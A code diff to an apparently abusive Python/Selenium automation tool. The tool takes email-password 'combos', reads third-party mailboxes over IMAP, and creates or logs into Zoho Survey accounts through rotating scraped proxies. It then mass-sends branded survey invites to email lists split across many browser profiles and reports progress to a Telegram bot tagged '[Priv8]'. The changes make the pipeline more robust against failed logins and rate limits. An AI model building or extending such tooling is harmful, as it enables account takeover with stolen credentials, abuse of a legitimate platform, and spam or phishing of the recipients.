@@ -270,6 +270,15 @@ IMAP_MAP = {
     # OVH-hosted domains
     "solardropshipping.com": ("ssl0.ovh.net",    993),
     "nissannamiangelopolis.com.mx": ("ssl0.ovh.net", 993),
+    # LernSax (German education network) — imap.lernsax.de:993 works, mail. does not
+    "lernsax.de":                ("imap.lernsax.de",  993),
+    "schliebenschule.lernsax.de": ("imap.lernsax.de", 993),
+    # OVH-hosted (additional domains)
+    "cotedazurrestauration.com": ("ssl0.ovh.net", 993),
+    # vpro.com.tr
+    "vpro.com.tr": ("mail.vpro.com.tr", 993),
+    # Uvigo Spanish university
+    "alumnos.uvigo.es": ("imap.uvigo.es", 993),
 }
 
 def _imap_servers(email):
@@ -1447,23 +1456,54 @@ def _add_dummy_question(d, portal_id, dept_id, survey_id):
                       f"#/portal/{portal_id}/department/{dept_id}"
                       f"/survey/{survey_id}/builder")
         d.get(editor_url)
-        time.sleep(7)
-        # Click "Add Question" or "+" button if present
+        time.sleep(8)
+        # Check if survey already has questions (body text > threshold means content exists)
+        _body_text = (d.execute_script("return document.body.innerText") or "").lower()
+        if "drag and drop" not in _body_text and "paste your questions" not in _body_text:
+            CHECK_LOG.put(("info", "  _add_dummy_question: survey already has questions — skipping"))
+            return
+        # Strategy 1: Click "Multiple Choice (One Answer)" from the sidebar question types list
         added = d.execute_script("""
-            // Look for add question / new question button
-            for (var b of document.querySelectorAll('button,a,[class*="add"],[class*="addQuestion"]')) {
-                var t = (b.innerText||b.textContent||b.getAttribute('title')||'').trim().toLowerCase();
-                if ((t.includes('add') && t.includes('question')) || t === 'add question' || t === '+') {
-                    if (b.offsetParent) { b.click(); return true; }
+            // Try clicking first question type in sidebar (Multiple Choice One Answer)
+            var items = Array.from(document.querySelectorAll('*'));
+            for (var el of items) {
+                var t = (el.innerText || el.textContent || '').trim();
+                if (t === 'Multiple Choice' || t === 'Multiple Choice (One Answer)') {
+                    if (el.offsetParent && el.getBoundingClientRect().width > 0) {
+                        el.click(); return 'sidebar_mc';
+                    }
                 }
             }
+            // Strategy 2: click any visible li/div in question-types list
+            var lis = document.querySelectorAll('.question-types li, .questionTypeList li, [class*="questionType"] li');
+            if (lis.length > 0) { lis[0].click(); return 'sidebar_li'; }
+            // Strategy 3: drag-drop hint area click
+            var drop = document.querySelector('[class*="dropArea"],[class*="drop-area"],[class*="emptyPage"]');
+            if (drop) { drop.click(); return 'drop_area'; }
             return false;
         """)
+        time.sleep(3)
+        if not added:
+            # Strategy 4: use Zoho Survey API to add question via JS fetch
+            added = d.execute_script("""
+                // Try the newui add-question button in toolbar or page
+                for (var b of document.querySelectorAll('button, .zs-btn, [class*="addQ"], [class*="add-q"]')) {
+                    var t = (b.innerText||b.getAttribute('title')||'').trim().toLowerCase();
+                    if (t.includes('add') || t === '+') {
+                        if (b.offsetParent) { b.click(); return 'toolbar_btn'; }
+                    }
+                }
+                return false;
+            """)
+            time.sleep(2)
+        # After click, type question text if input appeared
         if added:
-            time.sleep(3)
-            # Type a default question text
             q_input = d.execute_script("""
-                return document.querySelector('textarea[class*="question"],input[class*="question"],textarea[placeholder*="question"],textarea') ;
+                return document.querySelector(
+                    'textarea[class*="question"], input[class*="question"], '
+                    'textarea[placeholder*="question"], textarea[placeholder*="Question"], '
+                    '.question-title textarea, .questionTitle textarea, textarea'
+                );
             """)
             if q_input:
                 d.execute_script(
@@ -1472,13 +1512,13 @@ def _add_dummy_question(d, portal_id, dept_id, survey_id):
                     q_input
                 )
                 time.sleep(0.5)
-        # Save/Done
-        for sel in ["button#save", "button.save", "//button[contains(.,'Save')]", "//button[contains(.,'Done')]"]:
-            by = By.XPATH if sel.startswith("//") else By.CSS_SELECTOR
-            els = [e for e in d.find_elements(by, sel) if e.is_displayed()]
-            if els:
-                d.execute_script("arguments[0].click();", els[0])
-                time.sleep(2); break
+            # Save
+            for sel in ["button#save", "button.save", "//button[contains(.,'Save')]", "//button[contains(.,'Done')]", "//button[contains(.,'Add')]"]:
+                by = By.XPATH if sel.startswith("//") else By.CSS_SELECTOR
+                els = [e for e in d.find_elements(by, sel) if e.is_displayed()]
+                if els:
+                    d.execute_script("arguments[0].click();", els[0])
+                    time.sleep(2); break
         CHECK_LOG.put(("info", f"  _add_dummy_question: added={added}"))
     except Exception as _eq:
         CHECK_LOG.put(("warn", f"  _add_dummy_question error: {_eq}"))
@@ -2009,12 +2049,30 @@ def _connect_thread(email, password, profile_idx, tg_token="", tg_chat=""):
 
     _stored_proxy = (prof.get("proxy") or "").strip()
     _REG_PROXY = ""
+    _use_direct = prof.get("use_direct_ip", False) or _stored_proxy.lower() == "direct"
 
     # Build exclusion set — don't reuse IPs already owned by other profiles
     _proxy_exclude = {p.get("proxy", "") for p in profiles
                       if str(p.get("idx","")) != str(profile_idx) and p.get("proxy","")}
 
-    if _stored_proxy and _quick_test_proxy(_stored_proxy):
+    if _use_direct:
+        _REG_PROXY = ""
+        CHECK_LOG.put(("info", "  Direct IP mode (no proxy) — skipping proxy fetch"))
+        if _stored_proxy.lower() == "direct":
+            # Reload + update to avoid overwriting concurrent changes
+            try:
+                _pf2 = _load_profiles()
+                _pr2 = next((p for p in _pf2 if str(p.get("idx","")) == str(profile_idx)), None)
+                if _pr2:
+                    _pr2["proxy"] = ""
+                    _save_profiles(_pf2)
+                    # Re-sync local prof reference
+                    prof["proxy"] = ""
+                    profiles = _pf2
+            except Exception as _e2:
+                CHECK_LOG.put(("warn", f"  direct proxy clear failed (non-fatal): {_e2}"))
+        CHECK_LOG.put(("info", "  direct: proxy cleared, proceeding to Chrome launch"))
+    elif _stored_proxy and _quick_test_proxy(_stored_proxy):
         _REG_PROXY = _stored_proxy
         CHECK_LOG.put(("info", f"  Stored proxy alive — reusing: {_REG_PROXY.rsplit('@',1)[-1]}"))
     else:
@@ -2030,12 +2088,33 @@ def _connect_thread(email, password, profile_idx, tg_token="", tg_chat=""):
         CHECK_LOG.put(("info", f"  Using proxy: {_REG_PROXY.rsplit('@',1)[-1]}"))
         prof["proxy"] = _REG_PROXY
         _save_profiles(profiles)
-    else:
+    elif not _use_direct:
         CHECK_LOG.put(("warn", "  No proxy available — using direct IP (may get rate-limited)"))
+    else:
+        CHECK_LOG.put(("info", "  Direct IP — no proxy"))
+
+    # Kill Chrome instances associated with THIS profile dir (orphans from failed attempts)
+    import subprocess as _sub2, psutil as _psutil
+    try:
+        _prof_dir_norm = prof["dir"].lower().replace("\\", "/")
+        _killed_pids = set()
+        for _proc in _psutil.process_iter(["pid", "name", "cmdline"]):
+            try:
+                _pname = (_proc.info["name"] or "").lower()
+                if "chrome" in _pname or "chromedriver" in _pname:
+                    _cmd = " ".join(_proc.info.get("cmdline") or []).lower().replace("\\", "/")
+                    if _prof_dir_norm in _cmd:
+                        _killed_pids.add(_proc.pid)
+                        _proc.kill()
+            except (_psutil.NoSuchProcess, _psutil.AccessDenied): pass
+        import time as _t2; _t2.sleep(0.8)
+    except Exception: pass
 
     d = None
     try:
+        CHECK_LOG.put(("info", f"  Launching Chrome for profile_{profile_idx} (proxy={'direct' if not _REG_PROXY else _REG_PROXY.rsplit('@',1)[-1]})..."))
         d = _build_driver(prof["dir"], proxy=_REG_PROXY, headless=_hidden_browser)
+        CHECK_LOG.put(("info", f"  Chrome launched OK"))
 
         # If we already have a stored Zoho password, try LOGIN first — skip registration
         _stored_pw = prof.get("zoho_password", "").strip()
@@ -2190,6 +2269,27 @@ def _connect_thread(email, password, profile_idx, tg_token="", tg_chat=""):
             if not portal_id:
                 CHECK_LOG.put(("info", "  portal not in URL — clicking dept card..."))
                 portal_id, dept_id = _click_dept_card_get_portal(d)
+            # Retry: if dept card returned page error, reload and try again
+            if not portal_id:
+                CHECK_LOG.put(("info", "  dept card failed — reloading survey page and retrying..."))
+                d.get("https://survey.zoho.com/survey/newui")
+                time.sleep(7)
+                _retry_cur = d.current_url
+                _retry_text = ""
+                try: _retry_text = (d.execute_script("return document.body.innerText") or "").lower()
+                except: pass
+                _retry_is_signin = any(kw in _retry_text for kw in ["sign in to access", "sign in to zoho", "enter your email address", "err_empty_response", "didn't send any data"])
+                if "survey.zoho.com" in _retry_cur and not _retry_is_signin:
+                    portal_id, dept_id = _extract_portal_dept(_retry_cur)
+                    if not portal_id:
+                        for _ in range(6):
+                            time.sleep(2)
+                            portal_id, dept_id = _extract_portal_dept(d.current_url)
+                            if portal_id: break
+                    if not portal_id:
+                        portal_id, dept_id = _click_dept_card_get_portal(d)
+                    if portal_id:
+                        CHECK_LOG.put(("ok", f"  portal extracted on retry: {portal_id}"))
             _existing_survey = (prof.get("survey_id") or "").strip()
             if _existing_survey:
                 survey_id = _existing_survey
@@ -2452,12 +2552,19 @@ def _connect_thread(email, password, profile_idx, tg_token="", tg_chat=""):
         ])
         if account_exists:
             CHECK_LOG.put(("info", "  Account already exists  switching to login flow"))
+            # Clear any newly-generated zoho_password from the register attempt — it's wrong
+            # The real password is unknown; pass empty so _login_existing_zoho tries OTP path
+            _reg_attempt_pw = prof.get("zoho_password", "")
+            if _reg_attempt_pw == zoho_pw:
+                # This password was just generated for the failed register — discard it
+                prof["zoho_password"] = ""
+                _save_profiles(profiles)
+                _reg_attempt_pw = ""
             login_result = _login_existing_zoho(d, email, password, reg_ts,
-                                                  stored_zoho_pw=prof.get("zoho_password"))
+                                                  stored_zoho_pw=_reg_attempt_pw)
             login_ok, login_zoho_pw = login_result if isinstance(login_result, tuple) else (login_result, None)
             if not login_ok:
-                CHECK_LOG.put(("err", "  Login failed for existing account  blocking combo + resetting profile"))
-                _block_combo(email)  # mark combo as unusable
+                CHECK_LOG.put(("err", "  Login failed for existing account  resetting profile (combo NOT blocked)"))
                 prof["status"] = "free"; prof["health"] = "login_failed"
                 _save_profiles(profiles)
                 if window: window.evaluate_js("refreshProfiles()")
@@ -2696,14 +2803,15 @@ def _connect_thread(email, password, profile_idx, tg_token="", tg_chat=""):
             except: pass
 
     except Exception as e:
-        CHECK_LOG.put(("err", f"  Connect error: {e}"))
+        _err_short = str(e)[:300]
+        CHECK_LOG.put(("err", f"  Connect error profile_{profile_idx}: {_err_short}"))
         try:
             if d:
                 snap = os.path.join(DIR, f"err_profile{profile_idx}.png")
                 d.save_screenshot(snap)
                 _tg_send_with_switch_btn(tg_token, tg_chat,
                     f"[Priv8] Connect ERROR\nProfile {profile_idx}\nEmail: {email}"
-                    f"\nError: {str(e)[:200]}\nTime: {time.strftime('%H:%M:%S')}", profile_idx)
+                    f"\nError: {_err_short}\nTime: {time.strftime('%H:%M:%S')}", profile_idx)
                 _tg_send_photo(tg_token, tg_chat, snap, f"Connect error  Profile {profile_idx}")
         except: pass
         prof["status"] = "free"; prof["health"] = "error"
@@ -3465,6 +3573,11 @@ def _send_thread(cfg, emails, test_email, profile_dir, proxy=None, prof_idx=None
         # Reuse existing survey if one is set; only create a new one if none provided
         if _cfg_survey:
             SEND_LOG.put(("info", f"  Reusing survey_id={_cfg_survey} (portal={_cfg_portal})"))
+            # Ensure survey has at least one question (needed for email invite to work)
+            try:
+                _add_dummy_question(d, _cfg_portal, _cfg_dept, _cfg_survey)
+            except Exception as _dqe:
+                SEND_LOG.put(("info", f"  dummy_q check: {_dqe}"))
         else:
             SEND_LOG.put(("info", f"  Creating survey: '{_brand_name}' (portal={_cfg_portal})"))
             _new_survey_id = _create_blank_survey(d, _cfg_portal, _cfg_dept, survey_name=_brand_name)
@@ -3981,21 +4094,28 @@ class API:
         tg_token   = payload.get("tg_token", "")
         tg_chat    = payload.get("tg_chat", "")
         if not email or not pw: return {"error": "missing_credentials"}
-        # If zoho_password provided, save it to profile before connecting
-        if zoho_pw:
-            _profiles = _load_profiles()
-            for _p in _profiles:
-                if str(_p["idx"]) == str(prof_idx):
+        # Sync zoho_password: save if provided, clear if explicitly empty (failed attempt cleanup)
+        _profiles = _load_profiles()
+        for _p in _profiles:
+            if str(_p["idx"]) == str(prof_idx):
+                if zoho_pw:
                     _p["zoho_password"] = zoho_pw
-                    break
-            _save_profiles(_profiles)
+                elif not zoho_pw and _p.get("status") != "active":
+                    # Clear stale failed-attempt password so we don't loop on bad pw
+                    _p["zoho_password"] = ""
+                break
+        _save_profiles(_profiles)
         profiles = _load_profiles()
         prof = next((p for p in profiles if str(p["idx"]) == str(prof_idx)), None)
         if not prof: return {"error": "profile_not_found"}
         if prof["status"] not in ("free","active"):
             return {"error": "profile_busy"}
         # Auto-assign proxy if profile has none — exclude IPs of other profiles
-        if not (prof.get("proxy") or "").strip():
+        # "direct" is a sentinel meaning no proxy (bypass auto-assign)
+        _proxy_val = (prof.get("proxy") or "").strip()
+        if _proxy_val.lower() == "direct":
+            pass  # leave "direct" in profiles — _connect_thread will handle it
+        elif not _proxy_val:
             _exclude = {p.get("proxy", "") for p in profiles
                         if str(p.get("idx","")) != str(prof_idx) and p.get("proxy","")}
             _p = _fetch_fresh_proxyscrape_proxy(exclude=_exclude)
@@ -4036,6 +4156,40 @@ class API:
             if str(p["idx"]) == str(payload.get("idx",0)):
                 p["proxy"] = payload.get("proxy","").strip(); break
         _save_profiles(profiles); return {"ok": True}
+
+    def resend_confirmation(self, prof_idx):
+        """Open profile browser, navigate to Zoho accounts, click resend confirmation."""
+        profiles = _load_profiles()
+        prof = next((p for p in profiles if str(p["idx"]) == str(prof_idx)), None)
+        if not prof: return {"error": "profile_not_found"}
+        def _do():
+            d = None
+            try:
+                d = _build_driver(prof["dir"], proxy=prof.get("proxy") or None, size=(1200,900), headless=False)
+                d.get("https://survey.zoho.com/survey/newui"); time.sleep(6)
+                DI.login_if_needed(d, email=prof.get("email"), imap_pw=prof.get("imap_pw"))
+                # Navigate to Zoho accounts resend page
+                d.get("https://accounts.zoho.com/accounts/resendconfirmation"); time.sleep(5)
+                # Click resend button if present
+                clicked = d.execute_script("""
+                    for (var b of document.querySelectorAll('button,a,input[type=submit]')) {
+                        var t = (b.innerText||b.value||b.textContent||'').trim().toLowerCase();
+                        if (t.includes('resend') || t.includes('confirm') || t.includes('send')) {
+                            if (b.offsetParent) { b.click(); return t; }
+                        }
+                    }
+                    return false;
+                """)
+                CHECK_LOG.put(("ok", f"  resend_confirmation P7: clicked={clicked}"))
+                time.sleep(5)
+            except Exception as e:
+                CHECK_LOG.put(("err", f"  resend_confirmation error: {e}"))
+            finally:
+                if d:
+                    try: d.quit()
+                    except: pass
+        threading.Thread(target=_do, daemon=True).start()
+        return {"ok": True, "msg": "resend_confirmation started"}
 
     def check_proxy_ip_by_idx(self, prof_idx):
         """Check proxy IP for a specific profile — uses profile's stored proxy."""
@@ -4118,7 +4272,8 @@ class API:
     def send(self, payload):
         global _send_running
         if _send_running: return {"error": "already_running"}
-        cfg        = payload.get("cfg", {})
+        import copy as _copy
+        cfg        = _copy.deepcopy(payload.get("cfg", {}))
         emails_raw = payload.get("emails","")
         file_path  = payload.get("file_path","")
         test_email = payload.get("test_email","")
@@ -4141,6 +4296,14 @@ class API:
             if prof:
                 profile_dir = prof["dir"]
                 proxy = prof.get("proxy") or None
+                # Pre-fill portal/dept/survey from profile
+                if not cfg.get("portal"):
+                    cfg["portal"] = prof.get("portal_id", "")
+                    cfg["dept"]   = prof.get("dept_id", "")
+                if not cfg.get("survey"):
+                    _tpl_key = (cfg.get("active_templates") or [{}])[0].get("id", "") if cfg.get("active_templates") else ""
+                    _surveys = prof.get("surveys", {}) or {}
+                    cfg["survey"] = _surveys.get(_tpl_key) or prof.get("survey_id", "") or ""
 
         threading.Thread(target=_send_thread,
                          args=(cfg, emails, test_email, profile_dir, proxy, prof_idx),
@@ -4151,6 +4314,7 @@ class API:
     def send_all_profiles(self, payload):
         global _send_running
         if _send_running: return {"error": "already_running"}
+        import copy as _copy
         cfg        = payload.get("cfg", {})
         emails_raw = payload.get("emails", "")
         file_path  = payload.get("file_path", "")
@@ -4170,14 +4334,26 @@ class API:
             chunk = all_emails[i*chunk_size:(i+1)*chunk_size]
             if not chunk: continue
             proxy = prof.get("proxy") or None
+            # Give each profile thread its own cfg copy — prevents portal/survey cross-contamination
+            prof_cfg = _copy.deepcopy(cfg)
+            # Pre-fill portal/dept/survey from this profile so each thread uses the right IDs
+            prof_cfg["portal"] = prof.get("portal_id", "") or cfg.get("portal", "")
+            prof_cfg["dept"]   = prof.get("dept_id", "")   or cfg.get("dept", "")
+            # survey: prefer template-specific key, then generic survey_id
+            _tpl_key = (cfg.get("active_templates") or [{}])[0].get("id", "") if cfg.get("active_templates") else ""
+            _surveys = prof.get("surveys", {}) or {}
+            prof_cfg["survey"] = _surveys.get(_tpl_key) or prof.get("survey_id", "") or cfg.get("survey", "")
             t = threading.Thread(
                 target=_send_thread,
-                args=(cfg, chunk, "", prof["dir"], proxy, prof["idx"]),
+                args=(prof_cfg, chunk, "", prof["dir"], proxy, prof["idx"]),
                 kwargs={"_managed": True},
                 daemon=True)
             t.start()
             threads.append(t)
-            SEND_LOG.put(("info", f"  Profile {prof['idx']} ({prof.get('email','?')}): {len(chunk)} emails"))
+            SEND_LOG.put(("info", f"  Profile {prof['idx']} ({prof.get('email','?')}): {len(chunk)} emails | portal={prof_cfg['portal']} survey={prof_cfg['survey']}"))
+        if not threads:
+            _send_running = False
+            return {"error": "no_chunks"}
         _tg_tok = cfg.get("tg_token", "")
         _tg_ch  = cfg.get("tg_chat", "")
         def _watcher(tlist=threads, _n=len(all_emails), _ap=len(active)):
